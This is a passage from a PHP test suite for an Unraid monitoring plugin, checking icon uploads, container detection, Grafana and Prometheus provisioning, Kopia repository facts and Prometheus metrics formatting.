    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
    check('upload: a 1x1 PNG', clIconUploadOk($png));
    check('upload: 1000 pixels wide refused', !clIconUploadOk(substr_replace($png, pack('N', 1000), 16, 4)));
    check('upload: a JPEG refused', !clIconUploadOk("\xFF\xD8\xFF\xE0" . substr($png, 4)));
    check('upload: too big refused', !clIconUploadOk($png . str_repeat("\0", CL_UPLOAD_MAX)));
    check('upload: cut off refused', !clIconUploadOk(substr($png, 0, -12)));
    $r = ['items' => [['id' => 'icon:web', 'upload' => base64_encode($png)], ['id' => 'icon:db', 'url' => ' https://x/a.png ']]];
    same('upload: items', ['icon:web' => ['url' => null, 'png' => $png], 'icon:db' => ['url' => 'https://x/a.png', 'png' => null]], clIconItems($r));
    try {
        clIconItems(['items' => [['id' => 'icon:web', 'upload' => 'not base64!']]]);
        check('upload: bad base64 refused', false);
    } catch (Problem $p) {
        same('upload: bad base64 refused', 'cleanup_icon_upload_bad', $p->key);
    }

    // kept in the office's icons folder: the same picture again reused, another one beside it; put back takes mine away while unchanged
    $icons = "$tmp/icons";
    $a = clIconStore('web', $png, $icons);
    same('store: new', ['path' => "$icons/web.png", 'created' => true, 'md5' => md5($png)], $a);
    same('store: the same again', ['path' => "$icons/web.png", 'created' => false, 'md5' => md5($png)], clIconStore('web', $png, $icons));
    $other = substr_replace($png, pack('N', 2), 16, 4);
    same('store: another beside it', "$icons/web-2.png", clIconStore('web', $other, $icons)['path']);
    same('store: found for the container again', ["$icons/web-2.png", "$icons/web.png"], clIconUploads('web', $icons));
    clIconUnstore("$icons/web-2.png", md5($png), $icons);
    check('unstore: a changed file stays', is_file("$icons/web-2.png"));
    clIconUnstore("$tmp/png", (string) md5_file("$tmp/png"), $icons);
    check('unstore: nothing outside the folder', is_file("$tmp/png"));
    file_put_contents("$tmp/templates/my-web.xml", $old);
    $new = clXmlSetIcon($old, "file://$icons/web.png", 't');
    clIconReplace("$tmp/templates/my-web.xml", $new, "$tmp/trash/run/icons/up/my-web.xml");
    clIconPutBack("$tmp/trash/run/icons/up/my-web.xml", ['from' => "$tmp/templates/my-web.xml", 'written' => md5($new), 'was' => 'there',
        'uploads' => [$a['path'] => $a['md5']]], ["$tmp/ram"], $icons);
    check('put back: the uploaded picture is gone, the other stays', !is_file("$icons/web.png") && is_file("$icons/web-2.png"));

    // previews: PNG and JPEG as data: addresses, within the budget, only files on the server
    file_put_contents("$tmp/p.png", $png);
    file_put_contents("$tmp/a.jpg", "\xFF\xD8\xFF\xE0xx");
    file_put_contents("$tmp/a.txt", 'hello');
    $p64 = 'data:image/png;base64,' . base64_encode($png);
    same('preview: PNG, JPEG, not text', [$p64, 'data:image/jpeg;base64,' . base64_encode("\xFF\xD8\xFF\xE0xx"), null],
        [clIconPreview("$tmp/p.png"), clIconPreview("$tmp/a.jpg"), clIconPreview("$tmp/a.txt")]);
    $room = [['category' => 'template', 'candidates' => [['url' => "file://$tmp/p.png"], ['url' => "file://$tmp/a.jpg"], ['url' => 'https://x/a.png']]],
             ['category' => 'ok', 'candidates' => [['url' => "file://$tmp/a.txt"]]]];
    same('previews: only files, within the budget', ["file://$tmp/p.png" => $p64, "file://$tmp/a.jpg" => null], clIconPreviews($room, strlen($p64) + 5));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** The Consultant: which container is which external, and whether the node exporter reads the office's folder */
function testAdvisor(): void
{
    foreach (['quay.io/prometheus/node-exporter:latest-distroless' => 'node-exporter', 'prom/prometheus' => 'prometheus',
              'grafana/grafana:12.1.0' => 'grafana', 'grafana/loki:master' => 'loki', 'registry:5000/Team/App:1' => 'app',
              'bitnami/node-exporter@sha256:ab12' => 'node-exporter', 'redis' => 'redis'] as $image => $want) {
        same("advisor: image name of $image", $want, advisorImageName($image));
    }
    $c = fn (string $name, string $image, bool $running = true) => ['name' => $name, 'image' => $image, 'running' => $running];
    $all = ['loki' => $c('loki', 'grafana/loki:master'), 'renderer' => $c('renderer', 'grafana/grafana-image-renderer'),
            'old' => $c('Grafana-old', 'grafana/grafana-oss', false), 'Grafana' => $c('Grafana', 'grafana/grafana'),
            'prometheus' => $c('prometheus', 'prom/prometheus'), 'exp' => $c('Node-Exporter', 'quay.io/prometheus/node-exporter:latest-distroless'),
            'qbit' => $c('qbit-exporter', 'esanchezm/prometheus-qbittorrent-exporter'), 'kopia' => $c('KopiaUI', 'ghcr.io/imagegenius/kopia')];
    $find = fn (string $id, array $list) => advisorFindContainer(ADVISOR_EXTERNALS[$id], $list)['name'] ?? null;
    same('advisor: Grafana, the running one, not Loki or the renderer', 'Grafana', $find('grafana', $all));
    same('advisor: a stopped Grafana is found too', 'Grafana-old', $find('grafana', array_diff_key($all, ['Grafana' => 1])));
    same('advisor: Loki is grafana/loki', 'loki', $find('loki', $all));
    same('advisor: Prometheus, not an exporter for it', 'prometheus', $find('prometheus', $all));
    same('advisor: no Prometheus without one', null, $find('prometheus', ['qbit' => $all['qbit']]));
    same('advisor: the node exporter by its image', 'Node-Exporter', $find('nodeexporter', $all));
    same('advisor: a node exporter by its name', 'node_exporter', $find('nodeexporter', [$c('node_exporter', 'some/thing')]));
    same('advisor: Kopia as before (image or name contains it)', 'KopiaUI', $find('kopia', $all));

    // the template's Post Arguments: the host's / is /host in there
    $template = ['--path.rootfs=/host', '--path.procfs=/host/proc', '--path.sysfs=/host/sys', '--path.udev.data=/host/run/udev/data'];
    $root = [['/', '/host']];
    same('advisor: textfile — the template alone reads nothing', [], advisorTextfileDirs($template, $root));
    same('advisor: textfile — through /host', [ADVISOR_METRICS_DIR],
        advisorTextfileDirs([...$template, '--collector.textfile.directory=/host' . ADVISOR_METRICS_DIR], $root));
    same('advisor: textfile — a path of its own, the deepest mount wins', [ADVISOR_METRICS_DIR],
        advisorTextfileDirs(['--collector.textfile.directory', '/textfile/'], [['/', '/host'], [ADVISOR_METRICS_DIR . '/', '/textfile']]));
    same('advisor: textfile — inside the container only: not on the host', [],
        advisorTextfileDirs(['--collector.textfile.directory=/var/lib/node_exporter'], [['/mnt/user/appdata/x', '/config']]));
    same('advisor: textfile — /hostile is not under /host', [], advisorTextfileDirs(['--collector.textfile.directory=/hostile/x'], $root));
    same('advisor: textfile — on the host (the plugin), given twice', [ADVISOR_METRICS_DIR, '/var/lib/x'],
        advisorTextfileDirs(['--collector.textfile.directory="' . ADVISOR_METRICS_DIR . '/"', '--collector.textfile.directory=/var/lib/x'], null));
}

/** The Consultant installs: his templates, what he refuses, what he writes beforehand (only where nothing is), the facts he reads */
function testAdvisorInstall(): void
{
    // the provisioned dashboard keeps Grafana's value mappings as objects ("0", "1" … keys) and has its data source
    $src = __DIR__ . '/../monitoring/grafana-dashboard.json';
    $out = advisorDashboardJson($src);
    $objects = function (string $json): int {
        preg_match_all('/"options":\s*\{/', $json, $m);
        return count($m[0]);
    };
    same('advisor dashboard: mappings stay objects, data source filled in', [$objects((string) file_get_contents($src)), false],
        [$objects((string) $out), str_contains((string) $out, '${DS_PROMETHEUS}')]);

    // the provisioned dashboard kept current: only the office's own file (its uid), plain, never created; owner and mode kept
    $keep = hardeningTmp('advisor-dashboard');
    $dir = "$keep/provisioning/dashboards/uso";
    mkdir($dir, 0755, true);
    $file = "$dir/unraid-secretary-office.json";
    $old = str_replace('"title": "Unraid Secretary Office (USO)"', '"title": "The office"', (string) $out);
    check('advisor dashboard keep: the test\'s old version differs', $old !== $out);
    same('advisor dashboard keep: none there — none made', ['absent', false], [advisorDashboardKeep($file, $out), file_exists($file)]);
    file_put_contents($file, $old);
    chmod($file, 0640);
    $owner = posix_getuid() === 0 ? [472, 100] : [posix_getuid(), posix_getgid()];       // as root: Grafana's user, like a real one
    chown($file, $owner[0]);
    chgrp($file, $owner[1]);
    $ino = fileinode($file);
    same('advisor dashboard keep: an older version of the office\'s — replaced, owner and mode kept, a new file', ['updated', $out, 0640, $owner, true],
        [advisorDashboardKeep($file, $out), file_get_contents($file), fileperms($file) & 0777, [fileowner($file), filegroup($file)],
         (clearstatcache() ?? true) && fileinode($file) !== $ino]);
    same('advisor dashboard keep: the same — left alone', 'same', advisorDashboardKeep($file, $out));
    same('advisor dashboard keep: nothing to give', 'none', advisorDashboardKeep($file, null));
    $theirs = (string) json_encode(['uid' => 'my-own-copy', 'title' => 'Mine', 'panels' => []]);
    file_put_contents($file, $theirs);
    same('advisor dashboard keep: another uid (the user\'s own) — never touched', ['foreign', $theirs], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
    file_put_contents($file, 'not json');
    same('advisor dashboard keep: no JSON — never touched', ['foreign', 'not json'], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
    unlink($file);
    file_put_contents("$keep/elsewhere.json", $old);
    symlink("$keep/elsewhere.json", $file);
    same('advisor dashboard keep: a link — never followed, never replaced', ['foreign', $old, true],
        [advisorDashboardKeep($file, $out), file_get_contents("$keep/elsewhere.json"), is_link($file)]);
    unlink($file);
    rename($dir, "$keep/real-uso");
    file_put_contents("$keep/real-uso/unraid-secretary-office.json", $old);
    symlink("$keep/real-uso", $dir);
    same('advisor dashboard keep: its folder a link — never written through', ['foreign', $old],
        [advisorDashboardKeep($file, $out), file_get_contents("$keep/real-uso/unraid-secretary-office.json")]);
    same('advisor dashboard keep: no tmp files left', [], array_values(array_filter(scandir("$keep/real-uso"), fn ($f) => str_ends_with($f, '.tmp'))));
    // at his scan or hourly: only while Grafana runs, in the provisioning folder its mappings give
    unlink($dir);
    rename("$keep/real-uso", $dir);
    $g = ['running' => false, 'host' => "$keep/provisioning"];
    advisorDashboardCurrent($g);
    same('advisor dashboard current: Grafana stopped — not looked at', $old, file_get_contents($file));
    advisorDashboardCurrent(['running' => true] + $g);
    same('advisor dashboard current: Grafana running — the office\'s dashboard of this version', advisorDashboardJson(ADVISOR_DASHBOARD_FILE), file_get_contents($file));
    exec('rm -rf ' . escapeshellarg($keep));
    // Unraid's exclusive shares: only /mnt/user/<share> → /mnt/<pool>/<share> is followed; other paths stay
    same('advisor: a path outside /mnt/user stays', '/tmp/x/y', advisorUnraidPath('/tmp/x/y'));
    same('advisor: a share that is no link stays', '/mnt/user/zz-uso-no-such-share/a', advisorUnraidPath('/mnt/user/zz-uso-no-such-share/a'));
    $tmp = hardeningTmp('advisor-install');
    mkdir("$tmp/appdata");
    mkdir("$tmp/tu");
    $env = ['appdata' => "$tmp/appdata", 'ip' => '192.0.2.10', 'templates' => ADVISOR_TEMPLATE_DIR, 'user_templates' => "$tmp/tu",
            'prepared' => "$tmp/prepared", 'containers' => [], 'dashboard' => ADVISOR_DASHBOARD_FILE, 'snapshots' => ADVISOR_SNAPSHOTS,
            'restore' => ADVISOR_RESTORE, 'metrics' => ADVISOR_METRICS_DIR, 'uid' => posix_getuid(), 'gid' => posix_getgid()];
    $formModes = ['rw', 'rw,slave', 'rw,shared', 'ro', 'ro,slave', 'ro,shared'];   // Unraid's form (CreateDocker.php): anything else becomes rw
    $byTarget = fn (array $t) => array_column($t['config'], null, 'target');
    foreach (['kopia' => 'kopia', 'nodeexporter' => 'Node-Exporter', 'prometheus' => 'prometheus', 'grafana' => 'Grafana'] as $id => $name) {
        $t = advisorTemplate($id, $env);
        same("advisor template $id: the container's name", $name, $t['name']);
        check("advisor template $id: everything filled in, no comment", !str_contains($t['xml'], '{{') && !str_contains($t['xml'], '<!--'));
        $c = $byTarget($t);
        same("advisor template $id: marked", ['Label', 'consultant'], [$c[ADVISOR_LABEL]['type'] ?? null, $c[ADVISOR_LABEL]['value'] ?? null]);
        same("advisor template $id: path modes Unraid's form knows", [],
            array_values(array_filter($t['config'], fn ($x) => $x['type'] === 'Path' && !in_array($x['mode'], $formModes, true))));
        same("advisor template $id: no markup in names and descriptions (the form puts them into HTML)", [],
            array_values(array_filter($t['config'], fn ($x) => preg_match('/[<>]/', $x['name']) === 1)));
        check("advisor template $id: no markup in the XML's descriptions", !preg_match('/Description="[^"]*(&lt;|&gt;)/', $t['xml']));
    }
    $k = $byTarget(advisorTemplate('kopia', $env));
    same('advisor kopia: the snapshots read-only at /uso', [ADVISOR_SNAPSHOTS, 'ro,slave'], [$k['/uso']['value'], $k['/uso']['mode']]);
    same('advisor kopia: the restore folder writable', [ADVISOR_RESTORE, 'rw'], [$k['/uso-restore']['value'], $k['/uso-restore']['mode']]);
    same('advisor kopia: root, appdata', ['0', '0', "$tmp/appdata/kopia"], [$k['PUID']['value'], $k['PGID']['value'], $k['/config']['value']]);
    same('advisor kopia: the WebUI password masked and empty', [true, ''], [$k['PASSWORD']['mask'], $k['PASSWORD']['value']]);
    $n = advisorTemplate('nodeexporter', $env);
    check('advisor node exporter: reads the office\'s folder', in_array(ADVISOR_METRICS_DIR, advisorTextfileDirs(preg_split('/\s+/', $n['post']), [['/', '/host']]), true));
    // a plain "ro" path: Docker picks rslave by itself for a source that holds its root; asked for
    // explicitly ("slave", "rslave") it refuses on Unraid, whose / is a private mount
    same('advisor node exporter: the host read-only, nothing explicit', ['ro', '--pid=host'], [$byTarget($n)['/host']['mode'], $n['extra']]);
    $g = $byTarget(advisorTemplate('grafana', $env));
    same('advisor grafana: provisioning inside its appdata', ADVISOR_GRAFANA_PROV, $g['GF_PATHS_PROVISIONING']['value']);
    same('advisor grafana: the admin password masked and empty', [true, ''], [$g['GF_SECURITY_ADMIN_PASSWORD']['mask'], $g['GF_SECURITY_ADMIN_PASSWORD']['value']]);
    same('advisor grafana: the real address', 'http://192.0.2.10:3000/', $g['GF_SERVER_ROOT_URL']['value']);
    same('advisor grafana: anonymous viewing off unless chosen', ['false', 'true'],
        [$g['GF_AUTH_ANONYMOUS_ENABLED']['value'], $byTarget(advisorTemplate('grafana', $env, ['anon' => true]))['GF_AUTH_ANONYMOUS_ENABLED']['value']]);
    $public = advisorInstallPublic(advisorInstallPlan('grafana', $env));
    same('advisor plan: masked values never in the preview', '', array_column($public['config'], null, 'target')['GF_SECURITY_ADMIN_PASSWORD']['value']);
    check('advisor plan: no file contents in the preview', !isset($public['files'][0]['content']));

    // what he refuses
    $cnt = fn (string $name, string $image) => [$name => ['name' => $name, 'image' => $image, 'running' => true]];
    same('advisor refuses: Kopia is there (by image)', 'ad_there',
        advisorInstallRefusal('kopia', 'kopia', ['containers' => $cnt('backup-thing', 'ghcr.io/imagegenius/kopia')] + $env)['key'] ?? null);
    same('advisor refuses: nothing in the way', null, advisorInstallRefusal('kopia', 'kopia', $env));
    touch("$tmp/tu/my-Kopia.xml");
    same('advisor refuses: a template of that name (any case)', ['ad_template_taken', 'my-Kopia.xml'],
        [advisorInstallRefusal('kopia', 'kopia', $env)['key'] ?? null, advisorInstallRefusal('kopia', 'kopia', $env)['params']['file'] ?? null]);
    same('advisor refuses: Grafana without the server\'s address', 'ad_no_ip', advisorInstallRefusal('grafana', 'Grafana', ['ip' => null] + $env)['key'] ?? null);
    same('advisor refuses: no appdata', 'ad_appdata', advisorInstallRefusal('grafana', 'Grafana', ['appdata' => "$tmp/none"] + $env)['key'] ?? null);
    same('advisor scan: appdata not looked at', null, advisorInstallRefusal('grafana', 'Grafana', ['appdata' => "$tmp/none"] + $env, false));
    try {
        advisorInstallPrepare('kopia', [], $env);
        check('advisor prepare: refused over a template', false);
    } catch (Problem $p) {
        same('advisor prepare: refused over a template', 'ad_template_taken', $p->key);
    }
    same('advisor prepare: nothing prepared then', false, is_dir("$tmp/prepared"));

    // Prometheus: its yml only where none is, the form's address
    $r = advisorInstallPrepare('prometheus', [], $env);
    $yml = "$tmp/appdata/prometheus/etc/prometheus.yml";
    check('advisor prometheus: yml written with the address', str_contains((string) @file_get_contents($yml), "targets: ['192.0.2.10:9100']"));
    check('advisor prometheus: data folder there', is_dir("$tmp/appdata/prometheus/data"));
    same('advisor prometheus: the form\'s address', ADVISOR_ADD_CONTAINER . "$tmp/prepared/prometheus.xml", $r['url']);
    check('advisor prometheus: the template in its folder', is_file("$tmp/prepared/prometheus.xml"));
    file_put_contents($yml, "mine\n");
    $r = advisorInstallPrepare('prometheus', [], $env);
    same('advisor prometheus: an existing yml stays', ["mine\n", [], [$yml]], [file_get_contents($yml), $r['written'], $r['kept']]);
    same('advisor prometheus: no temporary files left', [], glob("$tmp/appdata/prometheus/etc/.*.tmp") ?: []);

    // Grafana: the data source, the provider and the dashboard, there at its first start
    $r = advisorInstallPrepare('grafana', [], $env);
    $prov = "$tmp/appdata/grafana/provisioning";
    $ds = (string) @file_get_contents("$prov/datasources/uso-prometheus.yaml");
    check('advisor grafana: the data source', str_contains($ds, 'uid: ' . ADVISOR_DS_UID) && str_contains($ds, 'url: http://192.0.2.10:9090')
        && str_contains($ds, 'isDefault: true'));
    check('advisor grafana: the provider reads its folder', str_contains((string) @file_get_contents("$prov/dashboards/uso.yaml"), 'path: ' . ADVISOR_GRAFANA_PROV . '/dashboards/uso'));
    $dash = (string) @file_get_contents("$prov/dashboards/uso/unraid-secretary-office.json");
    $dj = json_decode($dash, true);
    if (is_file(ADVISOR_DASHBOARD_FILE)) {
        check('advisor grafana: the dashboard with its data source filled in', is_array($dj) && !str_contains($dash, '${DS_PROMETHEUS}')
            && str_contains($dash, '"' . ADVISOR_DS_UID . '"') && !isset($dj['__inputs']) && ($dj['uid'] ?? '') === 'unraid-secretary-office');
    }
    same('advisor grafana: the provisioning files are the ones he checks', advisorGrafanaRels(is_file(ADVISOR_DASHBOARD_FILE)),
        array_keys(advisorGrafanaFiles('192.0.2.10', true, ADVISOR_GRAFANA_PROV, ADVISOR_DASHBOARD_FILE)));
    same('advisor grafana: an existing Grafana keeps its default data source', true,
        str_contains(advisorGrafanaFiles('192.0.2.10', false, ADVISOR_GRAFANA_PROV, null)['datasources/uso-prometheus.yaml'][1], 'isDefault: false'));

    // never through a link
    mkdir("$tmp/appdata2");
    mkdir("$tmp/elsewhere");
    symlink("$tmp/elsewhere", "$tmp/appdata2/prometheus");
    try {
        advisorInstallPrepare('prometheus', [], ['appdata' => "$tmp/appdata2"] + $env);
        check('advisor: a link in appdata refused', false);
    } catch (Problem $p) {
        same('advisor: a link in appdata refused', 'ad_link', $p->key);
    }
    same('advisor: nothing written behind the link', [], array_values(array_diff(scandir("$tmp/elsewhere") ?: [], ['.', '..'])));

    // facts from docker inspect: the web page, Kopia's folders, Grafana's provisioning
    $inspect = fn (string $mode, array $bind, string $own = '') => ['Config' => ['Labels' => ['net.unraid.docker.webui' => 'http://[IP]:[PORT:51515]/']],
        'HostConfig' => ['NetworkMode' => $mode, 'PortBindings' => $bind], 'NetworkSettings' => ['Networks' => [$mode => ['IPAddress' => $own]]]];
    same('advisor web page: a published port', 'http://192.0.2.10:51600/', advisorWebUi($inspect('bridge', ['51515/tcp' => [['HostPort' => '51600']]], '172.17.0.5'), '192.0.2.10'));
    same('advisor web page: br0 — the container\'s own address', 'http://192.168.21.158:51515/', advisorWebUi($inspect('br0.21', [], '192.168.21.158'), '192.0.2.10'));
    same('advisor web page: the host\'s network', 'http://192.0.2.10:51515/', advisorWebUi($inspect('host', []), '192.0.2.10'));
    same('advisor web page: none without the label', null, advisorWebUi(['Config' => []], '192.0.2.10'));
    $kopia = ['Mounts' => [
        ['Type' => 'bind', 'Source' => ADVISOR_SNAPSHOTS, 'Destination' => '/backup-snapshots', 'RW' => false],
        ['Type' => 'bind', 'Source' => "$tmp/appdata/kopia", 'Destination' => '/config', 'RW' => true],
        ['Type' => 'volume', 'Source' => '/var/lib/docker/volumes/x/_data', 'Destination' => '/source', 'RW' => true],
        ['Type' => 'bind', 'Source' => '/mnt/user/kopia_tmp', 'Destination' => '/cache', 'RW' => true],
        ['Type' => 'bind', 'Source' => '/mnt/user/appdata/kopia/local/', 'Destination' => '/local', 'RW' => true],
        ['Type' => 'bind', 'Source' => ADVISOR_RESTORE, 'Destination' => ADVISOR_RESTORE_TARGET, 'RW' => true]],
        'Config' => ['Env' => ['PUID=0']]];
    mkdir("$tmp/appdata/kopia");
    $ki = advisorKopiaInfo(['name' => 'kopia', 'running' => true], $kopia);
    same('advisor kopia: where it sees the snapshots', '/backup-snapshots', $ki['sources']['target'] ?? null);
    same('advisor kopia: the restore folder', ADVISOR_RESTORE_TARGET, $ki['restore']['target'] ?? null);
    same('advisor kopia: folders for a repository', [['host' => '/mnt/user/appdata/kopia/local', 'target' => '/local']], $ki['folders']);
    same('advisor kopia: not connected without repository.config', ['connected' => false], $ki['repo']);
    file_put_contents("$tmp/appdata/kopia/repository.config", json_encode(['storage' => ['type' => 's3', 'config' => [
        'bucket' => 'nostromo', 'endpoint' => 's3.example.test', 'accessKeyID' => 'AKIASECRETID', 'secretAccessKey' => 'very-secret-key']],
        'hostname' => 'kopia', 'username' => 'root']));
    $facts = advisorKopiaInfo(['name' => 'kopia', 'running' => true], $kopia)['repo'];
    same('advisor kopia: the facts of a connection', ['connected' => true, 'type' => 's3', 'bucket' => 'nostromo', 'endpoint' => 's3.example.test', 'client' => 'root@kopia'], $facts);
    check('advisor kopia: no key among the facts', !str_contains(json_encode($facts), 'SECRET') && !str_contains(json_encode($facts), 'very-secret'));
    same('advisor kopia: not looked at while it is stopped', null, advisorKopiaInfo(['name' => 'kopia', 'running' => false], $kopia)['repo']);
    $graf = fn (string $prov) => ['Mounts' => [['Type' => 'bind', 'Source' => "$tmp/appdata/grafana", 'Destination' => '/var/lib/grafana', 'RW' => true]],
        'Config' => ['Env' => ["GF_PATHS_PROVISIONING=$prov"]]];
    $gi = advisorGrafanaInfo(['name' => 'Grafana', 'running' => true], $graf('/etc/grafana/provisioning'));
    same('advisor grafana as on nostromo: reads its own folder, the files would wait in appdata', [false, "$tmp/appdata/grafana/provisioning", ADVISOR_GRAFANA_PROV],
        [$gi['points'], $gi['host'], $gi['inside']]);
    $gi = advisorGrafanaInfo(['name' => 'Grafana', 'running' => true], $graf(ADVISOR_GRAFANA_PROV));
    same('advisor grafana pointed there: all set up', [true, true], [$gi['points'], advisorGrafanaPublic($gi)['done']]);

    // a plugin job, read back
    $base = "$tmp/job";
    file_put_contents("$base.json", json_encode(['id' => 'fcp', 'plugin' => 'fix.common.problems', 'url' => 'x', 'started' => time()]));
    file_put_contents("$base.out", "plugin: downloading\e[1m bold\e[0m\nplugin: done\n");
    same('advisor job: running without an exit code', 'running', advisorJob($base)['state'] ?? null);
    same('advisor job: its output without terminal codes', "plugin: downloading bold\nplugin: done\n", advisorJob($base)['output'] ?? null);
    file_put_contents("$base.done", "1\n");
    same('advisor job: failed', ['failed', 1], [advisorJob($base)['state'] ?? null, advisorJob($base)['exit'] ?? null]);
    file_put_contents("$base.done", "0\n");
    check('advisor job: done only when Unraid lists it', in_array(advisorJob($base)['state'] ?? null, ['done', 'unregistered'], true)
        && (advisorJob($base)['state'] === 'done') === (is_file('/var/log/plugins/fix.common.problems.plg') && is_file(HOUSE_PLUGINS . '/fix.common.problems.plg')));
    file_put_contents("$base.json", json_encode(['id' => 'nothing-of-his']));
    same('advisor job: only his externals', null, advisorJob($base));

    // the plugin addresses the page shows for installing by hand are the ones he installs
    $js = (string) file_get_contents(OFFICE_WEB . '/desks/advisor/desk.js');
    foreach (ADVISOR_EXTERNALS as $id => $how) {
        if (isset($how['plg'])) {
            check("advisor: desk.js shows the same address for $id", str_contains($js, "'" . $how['plg'] . "'"));
        }
    }
    hardeningRm($tmp);
}

/**
 * Reads Prometheus' text format back the way a strict parser does: HELP and
 * TYPE before a family's series, label values escaped, the same label names
 * within a family, no series twice, no family twice.
 *
 * @return array<string, array{type:string, help:string, samples:list<array{0:array<string,string>, 1:string}>}>|string  the families, or what is wrong
 */
function metricsParseBack(string $text): array|string
{
    $value = '"(?:[^"\\\\\n]|\\\\[\\\\"n])*"';
    $sample = '/^([a-zA-Z_][a-zA-Z0-9_]*)(?:\{([a-zA-Z_][a-zA-Z0-9_]*=' . $value . '(?:,[a-zA-Z_][a-zA-Z0-9_]*=' . $value . ')*)\})? (-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?|NaN|[+-]Inf)$/D';
    if ($text !== '' && !str_ends_with($text, "\n")) {
        return 'no newline at the end';
    }
    $families = [];
    $current = null;
    foreach (explode("\n", rtrim($text, "\n")) as $n => $line) {
        if (preg_match('/^# HELP ([a-zA-Z_][a-zA-Z0-9_]*) ((?:[^\\\\\n]|\\\\[\\\\n])*)$/D', $line, $m)) {
            if (isset($families[$m[1]])) {
                return "line $n: $m[1] twice";
            }
            $families[$m[1]] = ['type' => '', 'help' => $m[2], 'samples' => []];
            $current = $m[1];
        } elseif (preg_match('/^# TYPE ([a-zA-Z_][a-zA-Z0-9_]*) (gauge|counter)$/D', $line, $m)) {
            if ($m[1] !== $current || $families[$current]['type'] !== '') {
                return "line $n: TYPE out of place";
            }
            $families[$current]['type'] = $m[2];
        } elseif (preg_match($sample, $line, $m)) {
            if ($m[1] !== $current || $families[$current]['type'] === '') {
                return "line $n: a series without its HELP and TYPE";
            }
            preg_match_all('/([a-zA-Z_][a-zA-Z0-9_]*)=("(?:[^"\\\\\n]|\\\\[\\\\"n])*")/', $m[2] ?? '', $pairs, PREG_SET_ORDER);
            $labels = [];
            foreach ($pairs as [, $k, $v]) {
                $labels[$k] = stripcslashes(substr($v, 1, -1));
            }
            foreach ($families[$current]['samples'] as [$other]) {
                if (array_keys($other) !== array_keys($labels)) {
                    return "line $n: other label names than before";
                }
                if ($other === $labels) {
                    return "line $n: the same series twice";
                }
            }
            $families[$current]['samples'][] = [$labels, $m[3]];
        } else {
            return "line $n: not Prometheus' format: " . json_encode($line);
        }
    }
    return $families;
}

/** The office's numbers for Prometheus: the text format, what is left out, the size cap, the files, the desks' hooks */
function testMetrics(): void
{
    $GLOBALS['metricsNoted'] = [];
    $g = fn (string $name, array $samples, string $type = 'gauge') => ['name' => $name, 'type' => $type, 'help' => "about $name", 'samples' => $samples];

    // escaping: backslash, quote and newline in label values; backslash and newline in HELP
    $fam = metricsClean(['backup' => [['name' => 'uso_test_bytes', 'type' => 'gauge', 'help' => "two\nlines \\ and \"quotes\"",
        'samples' => [[['name' => "a\"b\\c\nd", 'kind' => 'app'], 12], [['kind' => 'vm', 'name' => 'Win 11'], 3.5]]]]]);
    same('metrics: text format with escapes', "# HELP uso_test_bytes two\\nlines \\\\ and \"quotes\"\n# TYPE uso_test_bytes gauge\n"
        . "uso_test_bytes{kind=\"app\",name=\"a\\\"b\\\\c\\nd\"} 12\nuso_test_bytes{kind=\"vm\",name=\"Win 11\"} 3.5\n", metricsRender($fam['backup']));
    $back = metricsParseBack(metricsRender($fam['backup']));
    same('metrics: escaped label value reads back', "a\"b\\c\nd", is_array($back) ? $back['uso_test_bytes']['samples'][0][0]['name'] : $back);
    same('metrics: numbers', ['1', '0', '7', '0.25', 'NaN', '+Inf', '-Inf', '1.0E+25'],
        array_map('metricsNumber', [1, 0, 7.0, 0.25, NAN, INF, -INF, 1e25]));
    same('metrics: a label value is cut to 200 bytes, control characters become spaces', [200, "a b"],
        [strlen(metricsLabelValue(str_repeat('é', 150))), metricsLabelValue("a\tb")]);

    // what doesn't fit Prometheus is left out — the rest stays
    $clean = metricsClean([
        'snapshot' => [
            $g('uso_ok', [[[], true], [['x' => '1'], 2]]),                      // other label names: the second goes
            $g('9uso_bad', [[[], 1]]), $g('uso-bad', [[[], 1]]), $g("uso_bad\n", [[[], 1]]), $g('other_metric', [[[], 1]]),
            $g('uso_type', [[[], 1]], 'histogram'),
            $g('uso_labels', [[['__name__' => 'x'], 1], [['a-b' => 'x'], 1], [["a\n" => 'x'], 1], [['a' => ['x']], 1], [['a' => 'x'], 'one'], [['a' => 'y'], 2]]),
            $g('uso_twice', [[['a' => 'x'], 1], [['a' => 'x'], 2]]),
            $g('uso_empty', []),
            'not a family',
        ],
        'backup' => [$g('uso_ok', [[[], 5]]), $g('uso_more', [[[], false]])],    // uso_ok again: the first desk keeps it
        'Bad-Area' => [$g('uso_area', [[[], 1]])],
    ]);
    same('metrics: valid families kept, by area', ['snapshot' => ['uso_ok', 'uso_labels', 'uso_twice'], 'backup' => ['uso_more']],
        array_map(fn ($fs) => array_column($fs, 'name'), $clean));
    same('metrics: one series per label set, only the first label names', [[[], '1']], $clean['snapshot'][0]['samples']);
    same('metrics: odd labels left out', [[['a' => 'y'], '2']], $clean['snapshot'][1]['samples']);
    same('metrics: a series twice — the first stays', [[['a' => 'x'], '1']], $clean['snapshot'][2]['samples']);
    same('metrics: false is 0', '0', $clean['backup'][0]['samples'][0][1]);
    check('metrics: anchored names', preg_match(METRICS_NAME, "uso_x\n") === 0 && preg_match(METRICS_FILE, "uso_x.prom\n") === 0);

    // the size cap: per-item series go first, then whole areas — never above the budget
    $many = array_map(fn ($i) => [['kind' => 'app', 'name' => "app-$i"], $i * 1000], range(1, 120));
    $areas = metricsClean(['backup' => [$g('uso_backup_package_bytes', $many), $g('uso_backup_running', [[[], 0]])],
                           'snapshot' => [$g('uso_snapshot_snapshots', [[['pool' => 'a'], 1], [['pool' => 'b'], 2]])]]);
    [$texts, $dropped] = metricsFit($areas, 2000);
    same('metrics cap: the family with the most series goes first', ['uso_backup_package_bytes'], $dropped);
    check('metrics cap: within the budget', array_sum(array_map('strlen', $texts)) <= 2000);
    [$texts, $dropped] = metricsFit($areas, 150);
    check('metrics cap: per-item ones before single numbers', $dropped[0] === 'uso_backup_package_bytes' && $dropped[1] === 'uso_snapshot_snapshots'
        && array_sum(array_map('strlen', $texts)) <= 150, json_encode($dropped));
    same('metrics cap: nothing left out when it fits', [], metricsFit($areas, 100000)[1]);

    // the files: one per area plus the office's, temp files in the same folder never "*.prom", stale ones go, foreign ones stay
    $dir = hardeningTmp('metrics') . '/metrics';
    $now = time();
